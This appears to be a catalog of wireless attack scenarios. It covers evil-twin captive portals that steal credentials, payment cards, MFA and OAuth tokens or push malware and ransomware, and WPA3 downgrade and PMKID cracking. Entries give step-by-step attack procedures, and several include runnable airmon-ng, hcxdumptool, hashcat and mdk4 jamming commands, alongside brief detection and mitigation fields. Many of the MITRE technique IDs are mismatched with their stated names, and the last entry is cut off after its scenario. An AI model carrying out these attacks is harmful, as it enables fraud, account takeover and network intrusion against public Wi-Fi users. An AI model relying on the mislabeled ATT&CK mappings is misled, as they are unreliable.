# Wireless Attacks (Advanced) Attacks

## Evil Twin Captive Portal – Credential Harvesting

- **Attack Type**: Evil Twin + Captive Portal
- **Target**: Public Wi-Fi Users
- **Vulnerability**: No authentication on open Wi-Fi; User trust
- **MITRE**: T1557.002 (Rogue Wi-Fi Access Point)
- **Impact**: Credential theft, account compromise
- **Tools**: airgeddon, dnsmasq, lighttpd
- **Scenario**: An attacker clones a public Wi-Fi and injects a fake login page to collect usernames and passwords.
- **Attack Steps**: Step 1: Attacker sets up a laptop with a wireless adapter to create a fake Wi-Fi network with the same name as a nearby public hotspot. Step 2: Using a tool like airgeddon, the attacker disconnects users from the original Wi-Fi so they automatically reconnect to the stronger, fake one. Step 3: A fake captive portal is configured to look like the original login page. Step 4: When victims connect, they see the fake login screen and input their credentials. Step 5: These credentials are captured and stored on the attacker's device.
- **Detection**: Wi-Fi anomaly detection, multiple SSIDs
- **Solution**: Use WPA2/WPA3 with authentication portals; detect rogue APs
- **Tags**: evil twin, captive portal, credential harvesting

## Evil Twin Captive Portal – Malware Drop via Fake Update

- **Attack Type**: Evil Twin + Captive Portal Injection
- **Target**: Laptops, phones
- **Vulnerability**: Open Wi-Fi + social engineering
- **MITRE**: T1189 (Drive-by Compromise)
- **Impact**: Malware infection, data theft
- **Tools**: airbase-ng, dnsmasq, Apache server
- **Scenario**: Victims are tricked into downloading malware disguised as a browser update from a fake captive portal.
- **Attack Steps**: Step 1: The attacker creates a fake Wi-Fi hotspot with the same name as the real one. Step 2: Deauths users from the real AP using aireplay-ng. Step 3: Redirects all connected users to a captive portal page with a pop-up saying "Update Your Browser to Continue". Step 4: The download link actually serves a malware payload like a keylogger. Step 5: Victim downloads and executes the file, infecting their system.
- **Detection**: AV scan, sandbox analysis, endpoint behavior
- **Solution**: Do not allow arbitrary downloads in captive portals; secure DNS
- **Tags**: malware, captive portal, evil twin

## Evil Twin Captive Portal – Phishing Redirection

- **Attack Type**: Evil Twin + Phishing via Captive Portal
- **Target**: Mobile users, tourists
- **Vulnerability**: Phishing via Wi-Fi captive page
- **MITRE**: T1566.002 (Spearphishing via Service)
- **Impact**: Credential compromise of email or social media
- **Tools**: Fluxion, nginx, hostapd
- **Scenario**: Redirecting users from captive portal to phishing sites that mimic social logins (e.g., Google, Facebook).
- **Attack Steps**: Step 1: Attacker starts a rogue AP using Fluxion with same SSID as hotel Wi-Fi. Step 2: Disconnects clients from original network using a deauth attack. Step 3: Victims reconnect to fake AP and get redirected to a captive portal asking for social login. Step 4: Login page mimics Google/Facebook, and credentials are captured. Step 5: Users are then redirected to a real webpage to reduce suspicion.
- **Detection**: Detect social login on captive pages; monitor unusual login alerts
- **Solution**: Use OAuth detection, secure captive portal flow
- **Tags**: phishing, evil twin, social login trap

## Evil Twin Captive Portal – Credit Card Skimming

- **Attack Type**: Evil Twin + Captive Payment Page
- **Target**: Hotel guests
- **Vulnerability**: Fake billing captive page
- **MITRE**: T1566.001 (Phishing: Website)
- **Impact**: Financial fraud, card theft
- **Tools**: hostapd-wpe, dns spoof, PHP server
- **Scenario**: A rogue captive portal mimics a hotel payment gateway and tricks users into entering card details.
- **Attack Steps**: Step 1: The attacker clones a hotel Wi-Fi and configures it as an open hotspot. Step 2: A captive portal is created that looks exactly like the hotel's card payment page. Step 3: When users connect, they’re asked to "verify" card details before accessing the internet. Step 4: Card information entered is sent directly to the attacker’s server. Step 5: The user is then redirected to the internet to make it seem legitimate.
- **Detection**: Monitor network for fake payment flows
- **Solution**: Use payment verification over HTTPS; validate AP origin
- **Tags**: credit card, phishing, evil twin

## Evil Twin with Captive Portal – MFA Token Stealing

- **Attack Type**: Evil Twin + MFA Phishing via Captive Portal
- **Target**: Corporate employees
- **Vulnerability**: MFA phishing via fake portal
- **MITRE**: T1556.002 (Adversary-in-the-Middle)
- **Impact**: Bypass of MFA, unauthorized access
- **Tools**: evilginx2, fake AP, phishing toolkit
- **Scenario**: The attacker intercepts MFA tokens by creating a fake login portal mimicking SSO/MFA provider.
- **Attack Steps**: Step 1: The attacker uses Evilginx2 to setup a phishing proxy mimicking an SSO login page. Step 2: A rogue AP is started with the same SSID as corporate Wi-Fi. Step 3: Victims connect and are redirected to a page asking for corporate credentials and MFA token. Step 4: Evilginx2 relays this to the real service and captures the session token. Step 5: The attacker uses the stolen session token to gain access without needing the victim’s password again.
- **Detection**: Look for mismatched SSO domains; session reuse alerts
- **Solution**: Use FIDO2/U2F hardware tokens; domain validation
- **Tags**: MFA, session hijack, evil twin

## Evil Twin – Redirect to Malicious App Store

- **Attack Type**: Evil Twin + Captive Portal Redirection
- **Target**: Android phone users
- **Vulnerability**: Fake app delivery via Wi-Fi
- **MITRE**: T1189 (Drive-by Compromise)
- **Impact**: App-based spyware/malware infection
- **Tools**: airgeddon, dnsmasq, lighttpd
- **Scenario**: The attacker creates a fake Wi-Fi network and redirects users to a malicious app store to download malware-laden apps.
- **Attack Steps**: Step 1: The attacker launches a fake Wi-Fi with the same name (SSID) as a nearby coffee shop. Step 2: Airgeddon is used to kick off users from the real network by flooding deauthentication packets. Step 3: The victim connects to the fake network and sees a captive portal saying: “To access free internet, download our official coffee shop app.” Step 4: Clicking the link redirects to a cloned fake app store that hosts a malicious app. Step 5: Once installed, the malware begins stealing data or tracking the device.
- **Detection**: Monitor for non-HTTPS redirects
- **Solution**: Only allow app downloads via official stores; enforce device management
- **Tags**: fake app, captive portal, android, evil twin

## Evil Twin Captive Portal – Ransomware Dropper Page

- **Attack Type**: Evil Twin + Fake Update Ransomware
- **Target**: Laptops at airports
- **Vulnerability**: User trust in captive update pages
- **MITRE**: T1486 (Data Encrypted for Impact)
- **Impact**: Device lockdown, ransom demands
- **Tools**: airbase-ng, msfvenom, Apache
- **Scenario**: Victims are served ransomware disguised as a Wi-Fi client update through the captive portal.
- **Attack Steps**: Step 1: The attacker clones an airport Wi-Fi and broadcasts a stronger signal to attract connections. Step 2: Apache is configured to host a fake Wi-Fi client update webpage. Step 3: The captive portal says “Please update your Wi-Fi compatibility tool to continue.” Step 4: A ransomware dropper (created using msfvenom) is served as the download. Step 5: The victim runs the program, and the system is encrypted with a ransom note.
- **Detection**: Ransomware beacon detection, file behavior monitoring
- **Solution**: Block EXE downloads; use app whitelisting
- **Tags**: ransomware, captive portal, fake update

## Evil Twin – Wi-Fi Survey Theft via Portal

- **Attack Type**: Evil Twin + Data Harvest
- **Target**: General public
- **Vulnerability**: Data harvesting via forms
- **MITRE**: T1557.002 (Rogue Wi-Fi Access Point)
- **Impact**: Identity theft, spam targeting
- **Tools**: hostapd, PHP server, MySQL
- **Scenario**: The captive portal mimics a survey form to trick users into submitting sensitive data.
- **Attack Steps**: Step 1: Attacker sets up rogue AP in a public event hall named “Free_Event_WiFi”. Step 2: When users connect, they are redirected to a portal asking them to fill out a short survey for access. Step 3: The form collects PII such as name, email, mobile number, and home address. Step 4: Submitted data is stored on attacker's backend database for later misuse. Step 5: The user is redirected to a thank-you page and internet access is simulated.
- **Detection**: Monitor captive portal forms, inspect portal domain
- **Solution**: Use HTTPS captive portals; disable data collection
- **Tags**: PII theft, survey abuse, rogue AP

## Evil Twin – DNS Hijack via Captive Portal

- **Attack Type**: Evil Twin + DNS Manipulation
- **Target**: Windows laptops, Android phones
- **Vulnerability**: DNS config modification via captive script
- **MITRE**: T1565.001 (DNS Hijacking)
- **Impact**: Long-term redirection, future attacks
- **Tools**: dnsspoof, airgeddon, iptables
- **Scenario**: The attacker uses captive portal to silently change DNS settings on victim’s device for future redirect control.
- **Attack Steps**: Step 1: The attacker launches a fake AP using airgeddon and sets up a fake captive portal. Step 2: When users connect, the captive portal displays a “Connection Setup” page. Step 3: The page injects JavaScript that changes DNS settings on Windows using PowerShell or Android DNS APIs. Step 4: Victim’s DNS is now redirected to attacker’s controlled servers, allowing future phishing/malware delivery. Step 5: User browses internet normally, unaware of the DNS hijack.
- **Detection**: DNS behavior analysis; script blocker
- **Solution**: Disable DNS changes via browser scripts; DNSSEC
- **Tags**: DNS hijack, captive injection

## Evil Twin – Credential Harvest + Session Replay

- **Attack Type**: Evil Twin + Replay Attack
- **Target**: Business users
- **Vulnerability**: Credential + token sniffing
- **MITRE**: T1071.001 (Web Protocols)
- **Impact**: Account hijack, data breach
- **Tools**: Wireshark, airgeddon, custom portal
- **Scenario**: Attacker captures login credentials via captive portal and replays session to hijack accounts.
- **Attack Steps**: Step 1: Fake AP launched in a co-working space using airgeddon. Step 2: The captive portal replicates a login page for a commonly used tool (e.g., Slack, Trello). Step 3: User enters credentials; attacker stores them and simultaneously sniffs session tokens using Wireshark. Step 4: Attacker replays session to gain instant access to user's account. Step 5: Changes password, deletes activity logs to remain hidden.
- **Detection**: Alert for new logins; session fingerprinting
- **Solution**: Secure session tokens; use MFA enforcement
- **Tags**: session hijack, replay, evil twin

## Evil Twin Captive Portal – Keylogging Injection

- **Attack Type**: Evil Twin + Script Injection
- **Target**: Office employees, students
- **Vulnerability**: Browser trust, JS execution
- **MITRE**: T1056.001 (Keylogging)
- **Impact**: Password theft, sensitive data exfil
- **Tools**: Bettercap, EvilPortal, JS keylogger
- **Scenario**: Captive portal delivers JavaScript keylogger to record everything typed by user after connection.
- **Attack Steps**: Step 1: Attacker builds a rogue AP using Bettercap and EvilPortal module. Step 2: Captive portal looks like a benign login page (e.g., company SSO). Step 3: The HTML page contains hidden JavaScript keylogger code. Step 4: Once users start typing, every keystroke is captured and sent to attacker's server. Step 5: Even after login, script remains active in background tab for data collection.
- **Detection**: Script behavior analysis; monitor outgoing data
- **Solution**: Use CSP headers; disable JS in captive pages
- **Tags**: keylogging, script injection, evil twin

## Evil Twin Captive Portal – OAuth Token Capture

- **Attack Type**: Evil Twin + OAuth Proxy
- **Target**: University students
- **Vulnerability**: Misuse of OAuth flow
- **MITRE**: T1557.002, T1556.002
- **Impact**: Google account compromise
- **Tools**: Evilginx2, fake AP, Nginx proxy
- **Scenario**: Captive portal pretends to offer login via Google but proxies OAuth flow to steal tokens.
- **Attack Steps**: Step 1: Attacker sets up a rogue AP at a campus cafe mimicking “Campus_WiFi”. Step 2: Captive portal shows “Login with Google to access free internet.” Step 3: Evilginx2 proxies the real OAuth flow, capturing tokens in real-time. Step 4: Attacker extracts OAuth token and uses it to access victim’s Google services. Step 5: Since OAuth tokens bypass password, access remains until token is revoked.
- **Detection**: Monitor unusual logins; OAuth misuse detection
- **Solution**: Use token binding; device-restricted OAuth
- **Tags**: oauth, google, token hijack

## Evil Twin Captive Portal – MITM via Captive JS

- **Attack Type**: Evil Twin + MITM Script Injection
- **Target**: Business travelers
- **Vulnerability**: Proxy setting abuse
- **MITRE**: T1557.001 (Man-in-the-Middle)
- **Impact**: Sensitive data capture
- **Tools**: MITMf, airbase-ng, JS injector
- **Scenario**: JavaScript loaded in captive portal modifies victim’s browser proxy to route traffic through attacker's server.
- **Attack Steps**: Step 1: Rogue AP launched using airbase-ng at a hotel. Step 2: Captive portal asks users to click "Continue to Internet", but injects a JS payload. Step 3: Payload modifies system proxy settings (on Windows/macOS) to route through MITMf proxy. Step 4: Attacker silently intercepts all HTTP traffic and some HTTPS (via SSL stripping). Step 5: Victim continues browsing without knowing all traffic is monitored.
- **Detection**: Monitor DNS & HTTP routes; inspect proxy settings
- **Solution**: Use proxy lock; force VPN; restrict auto-scripts
- **Tags**: MITM, proxy, captive injection

## Evil Twin Captive Portal – Wi-Fi Password Stealer

- **Attack Type**: Evil Twin + Fake WPA2 Login
- **Target**: Home users, employees
- **Vulnerability**: Trust in WPA2 prompts
- **MITRE**: T1557.002
- **Impact**: Future physical network access
- **Tools**: Fluxion, Bash script, HTML portal
- **Scenario**: Captive portal poses as a WPA2 login asking for SSID password, harvesting other private Wi-Fi keys.
- **Attack Steps**: Step 1: The attacker clones a Wi-Fi AP and sets it as WPA2-protected. Step 2: When users connect, Fluxion runs a fake WPA2 handshake challenge. Step 3: Users are redirected to a page asking for "Wi-Fi password verification." Step 4: If user enters their real home/office Wi-Fi key, it’s captured. Step 5: Attacker now has password to user’s private Wi-Fi network.
- **Detection**: WPA password reuse detection; endpoint prompts
- **Solution**: Never ask password via web form
- **Tags**: WPA2, password harvest, fake login

## Evil Twin Captive Portal – Clickjacking for Malware

- **Attack Type**: Evil Twin + Clickjacking
- **Target**: Library users
- **Vulnerability**: UI deception
- **MITRE**: T1201 (Input Capture)
- **Impact**: Malware execution
- **Tools**: HTML/CSS overlay trick, airbase-ng
- **Scenario**: Captive portal shows a fake “Click to Connect” button which overlays a hidden malware install trigger.
- **Attack Steps**: Step 1: Fake AP is set up in a library mimicking public Wi-Fi. Step 2: Captive portal displays a large “Connect to Internet” button. Step 3: Behind the button is an invisible iframe triggering a malware-laced file download. Step 4: When user clicks, they think they are connecting, but they are also starting a download. Step 5: Malware executes if user opens the downloaded file.
- **Detection**: Download monitoring, UI overlay detection
- **Solution**: Avoid opaque overlays in web UIs; scan downloads
- **Tags**: clickjacking, captive portal, fake connect

## Evil Twin – Fake Antivirus Alert via Captive Portal

- **Attack Type**: Evil Twin + Social Engineering
- **Target**: General public
- **Vulnerability**: User trust in system-like messages
- **MITRE**: T1204.002 (User Execution: Malicious File)
- **Impact**: Spyware infection, privacy breach
- **Tools**: airgeddon, Apache, fake HTML portal
- **Scenario**: The captive portal pretends to be a system antivirus alert, prompting users to install a “security patch” that is actually spyware.
- **Attack Steps**: Step 1: Attacker sets up a fake Wi-Fi with the same name as a local mall’s public network. Step 2: Victims are forced to connect after the attacker deauths them from the real access point. Step 3: When the user connects, a captive portal pops up mimicking a Windows/Mac antivirus warning saying “Malware detected – Download Security Patch”. Step 4: The download link points to a spyware-laced executable file. Step 5: If the user installs it, the spyware silently begins logging browser history, keystrokes, and screenshots.
- **Detection**: Monitor downloads from non-browser trusted portals
- **Solution**: Train users on fake system prompts; restrict downloads in captive portals
- **Tags**: spyware, fake AV, evil twin

## Evil Twin – Corporate Captive Portal Mimic for VPN Credential Theft

- **Attack Type**: Evil Twin + Credential Harvesting
- **Target**: Corporate users
- **Vulnerability**: Fake internal login mimicry
- **MITRE**: T1556.001 (Phishing for Credentials)
- **Impact**: VPN login compromise, lateral movement
- **Tools**: hostapd, PHP, MySQL, MITMf
- **Scenario**: The attacker mimics a corporate VPN login page in the captive portal to steal employee VPN credentials.
- **Attack Steps**: Step 1: The attacker names their rogue AP to match the company’s guest Wi-Fi (e.g., "AcmeCorp_Guest"). Step 2: Using hostapd and dnsmasq, they serve a captive portal page resembling the company’s VPN login screen (complete with logo and form). Step 3: Employees who connect are asked to "Log in to enable secure access". Step 4: Users unknowingly enter their real VPN username and password. Step 5: The attacker collects these credentials and may use them to access internal systems later.
- **Detection**: Look for failed logins from unknown IPs; user credential honeypots
- **Solution**: Use 2FA; alert on guest login attempts to corporate VPN
- **Tags**: VPN phishing, evil twin, SSO spoof

## Evil Twin – Email Credential Theft via Captive Portal

- **Attack Type**: Evil Twin + Webmail Phishing
- **Target**: Travelers, business professionals
- **Vulnerability**: Fake email login pages
- **MITRE**: T1566.002 (Spearphishing via Service)
- **Impact**: Account compromise, email access
- **Tools**: Fluxion, nginx, HTML template
- **Scenario**: The attacker’s captive portal mimics a popular webmail login (e.g., Outlook, Gmail) to harvest usernames and passwords.
- **Attack Steps**: Step 1: A rogue AP is launched with the name “Free_Airport_WiFi”. Step 2: Victims are deauthenticated from real AP using Fluxion’s deauth module. Step 3: The captive portal appears asking users to verify their email account to “continue using airport internet securely.” Step 4: The login page mimics Gmail, Yahoo, or Outlook layout precisely. Step 5: When the user enters credentials, they are stored by the attacker and the victim is redirected to a loading screen to appear legitimate.
- **Detection**: Look for unauthorized access in email logs; alert on new device login
- **Solution**: Use OAuth App Verification; block suspicious domains
- **Tags**: webmail, phishing, evil twin

## Evil Twin – Fake Billing Confirmation to Steal Credit Cards

- **Attack Type**: Evil Twin + Payment Harvesting
- **Target**: Hotel guests
- **Vulnerability**: Trust in hotel branding
- **MITRE**: T1566.001 (Phishing Website)
- **Impact**: Credit card fraud, identity theft
- **Tools**: Bettercap, EvilPortal, PHP
- **Scenario**: A captive portal pretends to be a hotel Wi-Fi billing system and tricks users into entering their credit card details for "confirmation".
- **Attack Steps**: Step 1: The attacker configures an EvilPortal template to mimic a hotel’s official billing portal. Step 2: Victims connect to the fake hotel Wi-Fi (named e.g., “Hotel_Suites_WiFi”). Step 3: The portal shows a message: “Your room Wi-Fi requires billing confirmation. Please enter your credit card to verify identity.” Step 4: The form accepts card number, CVV, expiration, and billing ZIP code, sending them directly to attacker’s server. Step 5: After submission, a fake “Access Approved” screen appears and redirects to internet.
- **Detection**: Monitor captive portals for sensitive form fields
- **Solution**: Use token-based hotel billing methods
- **Tags**: hotel spoof, payment phishing, evil twin

## Evil Twin – Mobile Carrier Billing Scam via Captive Portal

- **Attack Type**: Evil Twin + Premium SMS Scam
- **Target**: Smartphone users in public
- **Vulnerability**: Poor user awareness on number-based scams
- **MITRE**: T1585.001 (Adversary-in-the-Middle)
- **Impact**: Financial loss via mobile bill
- **Tools**: airbase-ng, HTML form, SMS gateway
- **Scenario**: The attacker’s captive portal tricks users into subscribing to a premium SMS service, billing them unknowingly.
- **Attack Steps**: Step 1: The attacker launches a fake AP at a train station with a common carrier-branded SSID (e.g., “Jio_FreeNet”). Step 2: Captive portal page says: “To access 30 mins of free internet, verify your phone number.” Step 3: User enters their phone number, and a background script subscribes them to a premium SMS service. Step 4: The user unknowingly starts getting charged ₹30–₹100 daily. Step 5: The attacker earns revenue via SMS affiliate scams.
- **Detection**: Track premium SMS services; telecom alerts
- **Solution**: Use OTP verification; restrict SMS-based billing
- **Tags**: SMS fraud, captive portal, telecom spoof

## PMKID Capture on WPA2 AP Posing as WPA3

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: WPA3-compatible Wi-Fi Router
- **Vulnerability**: WPA3 allows downgrade to WPA2
- **MITRE**: T1557.002 (Adversary-in-the-Middle)
- **Impact**: Wi-Fi password theft
- **Tools**: hcxdumptool, hcxpcapngtool, hashcat, Kali Linux
- **Scenario**: Attacker creates a fake WPA3 AP but uses WPA2 internally to allow PMKID capture.
- **Attack Steps**: Step 1: Use a compatible Wi-Fi card and Kali Linux.Step 2: Put Wi-Fi card into monitor mode using airmon-ng start wlan0.Step 3: Start hcxdumptool to capture PMKID from nearby routers with hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1.Step 4: Wait for a PMKID to be captured.Step 5: Convert file using hcxpcapngtool pmkid.pcapng -o pmkid_hash.txt.Step 6: Crack hash with hashcat -m 16800 pmkid_hash.txt wordlist.txt.
- **Detection**: Monitor Wi-Fi for rogue APs and sniffers
- **Solution**: Enforce WPA3-only, disable fallback to WPA2
- **Tags**: PMKID, WPA3, Hashcat

## Fake WPA3 AP Broadcasting WPA2 to Lure Victims

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Enterprise or Home Wi-Fi
- **Vulnerability**: Downgrade attack allows PMKID on WPA3 SSID
- **MITRE**: T1557 (Man-in-the-Middle)
- **Impact**: Theft of pre-shared key
- **Tools**: hostapd-wpe, airmon-ng, hcxdumptool
- **Scenario**: A fake Access Point is created that advertises itself as WPA3 but uses WPA2 underneath to trigger PMKID responses.
- **Attack Steps**: Step 1: Create a fake AP using hostapd-wpe with WPA3 SSID name but WPA2 encryption.Step 2: Wait for a nearby device to connect automatically.Step 3: Capture PMKID hash using hcxdumptool.Step 4: Convert and crack as before.Step 5: Retrieve password and use it to connect to real network.
- **Detection**: Monitor for rogue AP names
- **Solution**: Use Protected Management Frames (PMF) and WPA3 SAE
- **Tags**: Fake AP, WPA3 downgrade

## Downgrade WPA3-Enterprise to WPA2-Personal for PMKID Capture

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: WPA3-Enterprise Wi-Fi
- **Vulnerability**: Misconfigured clients may accept WPA2
- **MITRE**: T1584.005 (Compromise Infrastructure)
- **Impact**: Credential theft
- **Tools**: hostapd, hcxdumptool, airgeddon, hashcat
- **Scenario**: Attack simulates a rogue WPA3 Enterprise network that tricks clients into connecting via WPA2-Personal, making PMKID available.
- **Attack Steps**: Step 1: Setup a rogue AP with airgeddon, cloning SSID.Step 2: Force client deauthentication.Step 3: Client reconnects to fake AP running WPA2.Step 4: Capture PMKID using hcxdumptool.Step 5: Extract and crack hash.Step 6: Use cracked key to access actual network.
- **Detection**: Monitor enterprise APs via RADIUS logs
- **Solution**: Configure WPA3 Enterprise with strict enforcement
- **Tags**: WPA3 downgrade, PMKID

## Passive PMKID Harvesting from WPA2 Devices

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: WPA2 routers (posing as WPA3)
- **Vulnerability**: PMKID can be leaked during handshake
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Extract WPA2 keys silently
- **Tools**: hcxdumptool, hcxpcapngtool, hashcat, External Wi-Fi Adapter
- **Scenario**: Attacker passively listens for PMKID hashes without interacting with devices using special Wi-Fi dongle.
- **Attack Steps**: Step 1: Use an Alfa Wi-Fi adapter and Kali Linux.Step 2: Put card into monitor mode.Step 3: Start hcxdumptool to capture handshakes with PMKIDs passively.Step 4: Wait until several devices attempt to connect.Step 5: Convert and crack the captured hashes using hashcat.
- **Detection**: Use 802.11w PMF to prevent passive leaks
- **Solution**: Upgrade all clients and routers to strict WPA3
- **Tags**: Passive, PMKID, Sniffing

## WPA3 Router Misconfig Accepting WPA2 Clients

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Dual-mode WPA3 Router
- **Vulnerability**: Poor router security fallback design
- **MITRE**: T1557.002
- **Impact**: Network compromise
- **Tools**: hcxdumptool, hostapd, airodump-ng, hashcat
- **Scenario**: Some routers allow WPA2 fallbacks for older devices; attacker exploits this to capture PMKID hash.
- **Attack Steps**: Step 1: Identify target network using airodump-ng.Step 2: Detect WPA3 router accepting WPA2 fallback.Step 3: Start capturing with hcxdumptool to obtain PMKID.Step 4: Convert .pcapng to hash.Step 5: Crack hash using wordlist in hashcat.Step 6: Gain access using recovered password.
- **Detection**: Log devices using WPA2 instead of WPA3
- **Solution**: Disable WPA2 fallback, enforce WPA3
- **Tags**: WPA2 fallback, PMKID

## PMKID Attack on WPA3-Certified AP with Misconfigured Transition Mode

- **Attack Type**: Wi-Fi (802.11) - PMKID Hash Capture
- **Target**: WPA3 Transition Mode-enabled AP
- **Vulnerability**: Weak backward compatibility allows PMKID exfil
- **MITRE**: T1557.002 (Man-in-the-Middle)
- **Impact**: WPA3 password stolen using WPA2 hash
- **Tools**: hcxdumptool, hcxpcapngtool, hashcat, airmon-ng
- **Scenario**: Many WPA3 routers have a "Transition Mode" allowing WPA2 and WPA3 connections. This lets attackers collect PMKID from WPA2 while impersonating WPA3.
- **Attack Steps**: Step 1: Use airmon-ng to enable monitor mode on your wireless adapter.Step 2: Start hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1 to begin passive capture.Step 3: Wait for a client device to connect to a WPA3 router operating in "transition mode".Step 4: PMKID hashes may be captured during handshake with WPA2 fallback.Step 5: Convert .pcapng to .hash using hcxpcapngtool.Step 6: Use hashcat -m 16800 hash.txt rockyou.txt to brute-force the password.Step 7: Use the cracked key to connect to the real Wi-Fi network.
- **Detection**: Detect WPA2 connections to WPA3 routers via logs
- **Solution**: Disable transition mode or isolate WPA3 traffic
- **Tags**: PMKID, WPA3 Fallback

## Automated PMKID Collection Using hcxtools Script

- **Attack Type**: Wi-Fi (802.11) - PMKID Capture
- **Target**: Residential WPA2 routers
- **Vulnerability**: PMKID exposed in handshake even without client
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Mass Wi-Fi credential theft
- **Tools**: hcxdumptool, hcxpcapngtool, hashcat, Bash
- **Scenario**: An attacker uses an automated bash script to passively collect PMKIDs over several hours from all nearby WPA2 networks.
- **Attack Steps**: Step 1: Write a bash script to loop through Wi-Fi channels using hcxdumptool.Step 2: Start monitor mode with airmon-ng start wlan0.Step 3: Let the script rotate through channels 1–11, capturing PMKID from all visible routers.Step 4: Let it run for a few hours (or overnight).Step 5: Convert .pcapng files into hash format.Step 6: Use hashcat with various wordlists (e.g., weakpass) to crack multiple Wi-Fi keys.Step 7: Document how many networks were cracked.
- **Detection**: Detect unusual capture activity on Wi-Fi spectrum
- **Solution**: Limit handshake retries, enforce 802.11w
- **Tags**: PMKID Harvesting, WPA2

## Coaxing WPA3 Clients into WPA2 Reconnect with Signal Jamming

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: WPA3 Client Devices
- **Vulnerability**: Signal manipulation causes WPA2 downgrade
- **MITRE**: T1498.001 (Network Denial of Service)
- **Impact**: Rogue AP connection and key theft
- **Tools**: mdk4, airmon-ng, hostapd, hcxdumptool
- **Scenario**: By disrupting WPA3 signal and providing a stronger WPA2 version, clients may connect to WPA2 and leak PMKID.
- **Attack Steps**: Step 1: Use airmon-ng to start monitor mode.Step 2: Use mdk4 wlan0mon d -c [channel] to jam the legitimate WPA3 AP.Step 3: Simultaneously, launch a rogue AP using hostapd broadcasting same SSID on WPA2.Step 4: Wait for clients to reconnect to the fake AP.Step 5: Start hcxdumptool to capture PMKID.Step 6: Convert to hash and crack using hashcat.Step 7: Optionally use captured key to try lateral movement.
- **Detection**: Detect RF jamming and rogue beaconing
- **Solution**: Use Wi-Fi anomaly detection tools
- **Tags**: WPA3 Downgrade, PMKID

## Simulating Corporate WPA3 SSID as WPA2 to Target BYOD Devices

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Enterprise Wi-Fi (BYOD)
- **Vulnerability**: Devices may not verify encryption protocol
- **MITRE**: T1584.005
- **Impact**: Unauthorized access to internal network
- **Tools**: airgeddon, hostapd, hcxdumptool, hashcat
- **Scenario**: Employee phones and laptops connect to fake AP simulating corporate SSID as WPA2.
- **Attack Steps**: Step 1: Set up airgeddon and clone the corporate SSID as a WPA2 Personal AP.Step 2: Ensure the rogue AP runs on the same channel as the real one.Step 3: Monitor for BYOD (Bring Your Own Device) clients reconnecting.Step 4: Capture PMKID using hcxdumptool.Step 5: Convert to hash format.Step 6: Crack using known weak corporate passwords.Step 7: Use access to perform lateral network scanning.
- **Detection**: Log multiple SSID versions on same BSSID
- **Solution**: Enforce WPA3-only using RADIUS policies
- **Tags**: Fake SSID, WPA2 Trap

## Social Engineering to Trigger WPA3 Device WPA2 Fallback

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Human + WPA3 Router
- **Vulnerability**: Social trust leads to insecure connection
- **MITRE**: T1204 (User Execution)
- **Impact**: User inadvertently leaks Wi-Fi password
- **Tools**: hostapd, Smartphone
- **Scenario**: Attacker convinces user to "fix" their Wi-Fi by connecting to a WPA2 clone of their WPA3 router.
- **Attack Steps**: Step 1: Create a rogue AP using hostapd with SSID identical to the target’s WPA3 network.Step 2: Approach user and say, “There’s a Wi-Fi update for your home—please connect to XYZ_SETUP”.Step 3: User connects to the rogue WPA2 AP.Step 4: PMKID is captured as part of handshake.Step 5: Use hcxdumptool to collect and hashcat to crack.Step 6: Now use real password to connect to WPA3 network.Step 7: Continue monitoring network activity.
- **Detection**: Monitor for unexpected SSIDs and user behavior
- **Solution**: Train users about WPA3 security prompts
- **Tags**: Social Engineering, PMKID

## BSSID Spoofing to Bypass WPA3 Detection in Client

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: WPA3 Wi-Fi Clients
- **Vulnerability**: Clients trust BSSID, not protocol level
- **MITRE**: T1557.001 (Wi-Fi Spoofing)
- **Impact**: Wi-Fi credentials stolen silently
- **Tools**: macchanger, hostapd, hcxdumptool
- **Scenario**: A fake AP uses the same MAC address (BSSID) as the target WPA3 router but downgrades to WPA2 to trick clients.
- **Attack Steps**: Step 1: Use macchanger to spoof the BSSID of the target WPA3 AP.Step 2: Use hostapd to launch a WPA2 AP using same SSID and spoofed BSSID.Step 3: Clients may auto-connect to the stronger/faster signal.Step 4: Capture PMKID using hcxdumptool.Step 5: Crack hash as usual.Step 6: Use key to monitor network, or pivot.Step 7: Document client behavior for study.
- **Detection**: Track MAC address anomalies
- **Solution**: Use Protected Management Frames (PMF)
- **Tags**: BSSID Spoof, PMKID

## Downgrade Attack on IoT Devices Connecting to WPA3 AP

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: IoT Smart Devices
- **Vulnerability**: Weak protocol support in embedded systems
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Full Wi-Fi network compromise
- **Tools**: hostapd, hcxdumptool, IoT device
- **Scenario**: Smart bulbs/cameras often don’t support full WPA3, and may accept WPA2 downgrade connections.
- **Attack Steps**: Step 1: Identify SSID used by IoT devices (e.g., smart plug).Step 2: Launch a rogue WPA2 AP using same SSID.Step 3: Reboot IoT devices and observe if they connect to rogue AP.Step 4: Capture PMKID with hcxdumptool.Step 5: Crack key and join real WPA3 Wi-Fi.Step 6: Use compromised key for further attacks (e.g., MITM on cameras).Step 7: Report downgrade risks in IoT.
- **Detection**: Audit IoT Wi-Fi settings
- **Solution**: Segment IoT from core Wi-Fi or use WPA3-only band
- **Tags**: IoT, PMKID, WPA3 Fallback

## PMKID Attack on Hotel/Public Wi-Fi with Fake WPA3 Banner

- **Attack Type**: Wi-Fi (802.11) - WPA3 Downgrade
- **Target**: Public Wi-Fi
- **Vulnerability**: WPA version not verifiable by users
- **MITRE**: T1557.001
- **Impact**: Wi-Fi key theft and guest tracking
- **Tools**: hostapd, hcxdumptool, aircrack-ng, hashcat
- **Scenario**: Rogue public AP says it’s WPA3-secured but runs WPA2 to lure guests into PMKID capture.
